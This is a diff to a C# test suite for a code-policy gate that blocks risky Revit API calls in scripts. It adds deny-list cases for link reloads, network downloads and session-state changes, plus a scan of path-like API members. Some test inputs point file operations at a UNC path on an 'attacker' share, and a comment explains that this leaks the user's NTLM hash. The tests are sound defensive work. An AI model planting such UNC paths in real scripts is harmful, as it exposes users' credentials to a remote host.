@@ -139,6 +139,31 @@ namespace RevitWebAppSync.Tests
             ("system_not_allowed", "var c = System.Globalization.CultureInfo.CurrentCulture;"),
             ("system_not_allowed", "var u = new System.Uri(\"http://example.com\");"),
             ("assembly_not_allowed", "Print(BinaVibe.Copilot.Code.CodeGate.Hash(\"x\"));"),
+            // Fix round 1, C3: link reload and link-file writes
+            ("link_load", "RevitLinkType t = null;\nt.RevertLocalUnloadStatus();"),
+            ("link_load", "RevitLinkType t = null;\nt.UnloadLocally(null);"),
+            ("save_sync", "RevitLinkType t = null;\nt.SavePositions(null);"),
+            ("link_load", "doc.PublishCoordinates(new LinkElementId(new ElementId(1L)));"),
+            ("link_load", "var f = FabricationConfiguration.GetFabricationConfiguration(doc);\nf.LoadItemFiles(f.GetAllUsedItemFiles());"),
+            ("link_load", "FabricationConfiguration.GetFabricationConfiguration(doc).SetServicesToLoad(new List<int> { 1 });"),
+            ("link_load", "FabricationConfiguration.GetFabricationConfiguration(doc).ReloadConfiguration();"),
+            // Fix round 1, C2: structural path denial (UNC paths leak the drafter's NTLM hash during the preview)
+            ("paths", "var t = PointCloudType.Create(doc, \"rcp\", @\"\\\\attacker\\share\\x.rcp\");"),
+            ("paths", "Autodesk.Revit.DB.Analysis.SystemsAnalysisOptions o = null;\no.WeatherFile = @\"\\\\h\\s\\w.epw\";"),
+            ("paths", "Autodesk.Revit.DB.Analysis.SystemsAnalysisOptions o = null;\no.OutputFolder = @\"\\\\h\\s\";"),
+            ("paths", "Autodesk.Revit.DB.Analysis.ViewSystemsAnalysisReport r = null;\nPrint(r.SystemsAnalysisWorkflowFile);"),
+            ("paths", "Autodesk.Revit.DB.Analysis.EnergyDataSettings s = null;\nPrint(s.ReportsFolder);"),
+            ("paths", "Autodesk.Revit.DB.Analysis.EnergyDataSettings s = null;\ns.SetReportsFolder(@\"\\\\h\\s\");"),
+            ("paths", "DWGExportOptions o = null;\no.HatchPatternsFileName = @\"\\\\h\\s\\p.pat\";"),
+            ("paths", "ParameterUtils.WriteSharedParametersToFile(doc, @\"\\\\h\\s\\p.txt\");"),
+            ("network", "ParameterUtils.DownloadCompanyName(doc, SpecTypeId.String.Text);"),
+            ("network", "var o = ParameterUtils.DownloadParameterOptions(SpecTypeId.String.Text);"),
+            ("network", "var l = Autodesk.Revit.DB.ExternalData.ExtendedPropertiesLink.CreateFromCloudDataset(doc, \"urn:x\");"),
+            // Fix round 1, I3: state a rollback cannot undo
+            ("session_state", "Autodesk.Revit.DB.PointClouds.PointCloudEngineRegistry.UnregisterPointCloudEngine(\"rcp\");"),
+            ("session_state", "var s = new SketchEditScope(doc, \"x\");\ns.Start(new ElementId(1L));"),
+            ("session_state", "Autodesk.Revit.DB.Visual.AppearanceAssetEditScope s = null;\nPrint(s.IsActive);"),
+            ("session_state", "var b = new Autodesk.Revit.DB.ExtensibleStorage.SchemaBuilder(Guid.Empty);\nvar schema = b.Finish();"),
         };
 
         /// <summary>The engine's safety net for operations it has no rule for: shown on the bound
@@ -416,6 +441,12 @@ namespace RevitWebAppSync.Tests
         }
 
         [Theory]
+        [InlineData("paths", true)]
+        [InlineData("itemFiles", true)]
+        [InlineData("folderPath", true)]
+        [InlineData("url", true)]
+        [InlineData("serverUris", true)]
+        [InlineData("dirs", true)]
         [InlineData("path", true)]
         [InlineData("filePath", true)]
         [InlineData("fileName", true)]
@@ -426,8 +457,129 @@ namespace RevitWebAppSync.Tests
         [InlineData("filter", false)]
         public void PathParameterNames(string name, bool isPath)
         {
-            var tokens = CodePolicySet.Default.Rules.First(r => r.Kind == CodeRuleKinds.PathParameter).MatchSet;
+            var tokens = CodePolicySet.Default.Rules.First(r => r.Kind == CodeRuleKinds.PathMember).MatchSet;
             Assert.Equal(isPath, CodePolicy.IsPathName(name, tokens));
+        }
+
+        // ---- C2: every path-like Revit member is denied, cannot carry a path, or was reviewed ----
+
+        /// <summary>Path-like members (a name or parameter token is path/file/folder/dir/url/uri, plurals
+        /// included) that the policy allows and whose signature still holds something path-shaped (a type
+        /// named like a path or file, an interface or a delegate). Each was read and judged harmless.
+        /// A trailing * matches any member-name suffix.</summary>
+        internal static readonly (string Key, string Why)[] ReviewedPathLike =
+        {
+            ("Autodesk.Revit.DB.Analysis.PathOfTravel.*", "path-of-travel elements: geometry in a view, no files"),
+            ("Autodesk.Revit.DB.Analysis.CriticalPathCollector.GetCriticalPathCollectorIterator", "MEP critical-path analysis, a read"),
+            ("Autodesk.Revit.DB.Structure.PathReinforcement.*", "rebar path-reinforcement elements"),
+            ("Autodesk.Revit.DB.Structure.RebarHostData.GetPathReinforcementsInHost", "rebar host read"),
+            ("Autodesk.Revit.DB.Structure.RebarFreeFormAccessor.GetComputationDataFor3DPathSet", "free-form rebar geometry data"),
+            ("Autodesk.Revit.DB.Structure.RebarFreeFormAccessor.SetComputationDataFor3DPathSet", "free-form rebar geometry data (a write, previewed)"),
+            ("Autodesk.Revit.DB.FabricationConfiguration.AreItemFilesLoaded", "reads what the fabrication configuration already holds"),
+            ("Autodesk.Revit.DB.FabricationConfiguration.GetAllLoadedItemFiles", "reads what the fabrication configuration already holds"),
+            ("Autodesk.Revit.DB.FabricationConfiguration.GetAllUsedItemFiles", "reads what the fabrication configuration already holds"),
+            ("Autodesk.Revit.DB.FabricationConfiguration.GetItemFolders", "reads what the fabrication configuration already holds"),
+            ("Autodesk.Revit.DB.FabricationItemFolder.GetItemFiles", "reads what the fabrication configuration already holds"),
+            ("Autodesk.Revit.DB.FabricationItemFolder.GetSubFolders", "reads what the fabrication configuration already holds"),
+            ("Autodesk.Revit.DB.FabricationPart.Create", "places a part from an item file the configuration holds: a model write, previewed and approved"),
+            ("Autodesk.Revit.DB.BrowserOrganization.GetFolderItems", "project browser folders, a read"),
+            ("Autodesk.Revit.DB.ExternalResourceBrowserData.GetSubFoldersData", "unreachable: the only constructor takes a folder path and is denied"),
+            ("Autodesk.Revit.DB.Architecture.StairsPathType.StairsPathDirection", "enum value"),
+            ("Autodesk.Revit.DB.DefaultDivideSettings.PathMeasurementType", "enum value"),
+            ("Autodesk.Revit.DB.DGNExportOptions.FileVersion", "enum value on export options (export itself is denied)"),
+            ("Autodesk.Revit.DB.DisplacementPath.PathStyle", "enum value"),
+            ("Autodesk.Revit.DB.Electrical.ElectricalSystem.CircuitPathMode", "enum value"),
+            ("Autodesk.Revit.DB.ImageExportOptions.HLRandWFViewsFileType", "enum value on export options (export itself is denied)"),
+            ("Autodesk.Revit.DB.ImageExportOptions.ShadowViewsFileType", "enum value on export options (export itself is denied)"),
+            ("Autodesk.Revit.DB.ImageType.PathType", "enum value (absolute or relative), not the path"),
+            ("Autodesk.Revit.DB.RevitLinkType.PathType", "enum value (absolute or relative), not the path"),
+            ("Autodesk.Revit.DB.RevitLinkType.GetLinkedFileStatus", "enum value (loaded, unloaded, not found)"),
+        };
+
+        [Fact]
+        public void PathLikeRevitMembersAreDeniedOrReviewed()
+        {
+            var compilation = Microsoft.CodeAnalysis.CSharp.CSharpCompilation.Create("scan", null, CodeTestSupport.ProductionRefs(), CodeGate.CompilationOptions);
+            var tokens = CodePolicySet.Default.Rules.First(r => r.Kind == CodeRuleKinds.PathMember).MatchSet;
+            var unreviewed = new SortedSet<string>(StringComparer.Ordinal);
+            var used = new HashSet<string>(StringComparer.Ordinal);
+            var scanned = 0;
+            foreach (var asm in compilation.References.Select(compilation.GetAssemblyOrModuleSymbol)
+                         .OfType<Microsoft.CodeAnalysis.IAssemblySymbol>().Where(a => a.Name == "RevitAPI" || a.Name == "RevitAPIUI"))
+                foreach (var type in AllTypes(asm.GlobalNamespace).Where(t => t.DeclaredAccessibility == Microsoft.CodeAnalysis.Accessibility.Public
+                                                                             && t.TypeKind != Microsoft.CodeAnalysis.TypeKind.Enum))
+                    foreach (var m in type.GetMembers().Where(m => m.DeclaredAccessibility == Microsoft.CodeAnalysis.Accessibility.Public))
+                    {
+                        if (m is Microsoft.CodeAnalysis.IMethodSymbol ms && ms.AssociatedSymbol != null) continue; // accessors: judged through their property or event
+                        var parameters = m is Microsoft.CodeAnalysis.IMethodSymbol mm ? mm.Parameters
+                            : m is Microsoft.CodeAnalysis.IPropertySymbol pp ? pp.Parameters
+                            : System.Collections.Immutable.ImmutableArray<Microsoft.CodeAnalysis.IParameterSymbol>.Empty;
+                        if (!CodePolicy.IsPathName(m.Name, tokens) && !parameters.Any(p => CodePolicy.IsPathName(p.Name, tokens))) continue;
+                        scanned++;
+                        if (CodePolicy.Judge(compilation, m, MemberUsage.Read).Count > 0) continue;   // denied
+                        if (!CanCarryAPath(m, tokens)) continue;                                      // nothing in its signature can hold a path
+                        var key = SymbolKeys.TypeKey(type) + "." + m.Name;
+                        var reviewed = ReviewedPathLike.FirstOrDefault(r => CodePolicy.KeyMatches(key, r.Key));
+                        if (reviewed.Key == null) unreviewed.Add(key + " :: " + m.ToDisplayString());
+                        else used.Add(reviewed.Key);
+                    }
+
+            Assert.True(scanned > 400, "the scan found only " + scanned + " path-like members: is the Revit reference loaded?");
+            Assert.True(unreviewed.Count == 0, "path-like Revit members that are neither denied nor reviewed:\n" + string.Join("\n", unreviewed));
+            var stale = ReviewedPathLike.Select(r => r.Key).Where(k => !used.Contains(k)).ToList();
+            Assert.True(stale.Count == 0, "reviewed entries that no longer match anything (remove them): " + string.Join(", ", stale));
+        }
+
+        /// <summary>A string (or strings) anywhere in the signature is denied by path_member already; what
+        /// is left can hold a path only through a path- or file-named type, an interface or a delegate.</summary>
+        private static bool CanCarryAPath(Microsoft.CodeAnalysis.ISymbol member, ICollection<string> tokens)
+        {
+            IEnumerable<Microsoft.CodeAnalysis.ITypeSymbol> Signature()
+            {
+                switch (member)
+                {
+                    case Microsoft.CodeAnalysis.IMethodSymbol m:
+                        yield return m.ReturnType;
+                        foreach (var p in m.Parameters) yield return p.Type;
+                        break;
+                    case Microsoft.CodeAnalysis.IPropertySymbol p:
+                        yield return p.Type;
+                        foreach (var q in p.Parameters) yield return q.Type;
+                        break;
+                    case Microsoft.CodeAnalysis.IFieldSymbol f:
+                        yield return f.Type;
+                        break;
+                    case Microsoft.CodeAnalysis.IEventSymbol e:
+                        yield return e.Type;
+                        break;
+                }
+            }
+            IEnumerable<Microsoft.CodeAnalysis.ITypeSymbol> Flatten(Microsoft.CodeAnalysis.ITypeSymbol t)
+            {
+                yield return t;
+                if (t is Microsoft.CodeAnalysis.IArrayTypeSymbol a) foreach (var x in Flatten(a.ElementType)) yield return x;
+                if (t is Microsoft.CodeAnalysis.INamedTypeSymbol n) foreach (var g in n.TypeArguments) foreach (var x in Flatten(g)) yield return x;
+            }
+            return Signature().SelectMany(Flatten).Any(t =>
+                CodePolicy.Stringish(t)
+                || CodePolicy.IsPathName(t.Name, tokens)
+                || t.TypeKind == Microsoft.CodeAnalysis.TypeKind.Delegate
+                || (t.TypeKind == Microsoft.CodeAnalysis.TypeKind.Interface && !SymbolKeys.InNamespace(SymbolKeys.NamespaceName(t.ContainingNamespace), "System")));
+        }
+
+        private static IEnumerable<Microsoft.CodeAnalysis.INamedTypeSymbol> AllTypes(Microsoft.CodeAnalysis.INamespaceSymbol ns)
+        {
+            foreach (var t in ns.GetTypeMembers())
+                foreach (var x in WithNested(t)) yield return x;
+            foreach (var child in ns.GetNamespaceMembers())
+                foreach (var t in AllTypes(child)) yield return t;
+        }
+
+        private static IEnumerable<Microsoft.CodeAnalysis.INamedTypeSymbol> WithNested(Microsoft.CodeAnalysis.INamedTypeSymbol t)
+        {
+            yield return t;
+            foreach (var n in t.GetTypeMembers())
+                foreach (var x in WithNested(n)) yield return x;
         }
 
         // ---- the compiled-in table equals the checked-in JSON ---------------------------------
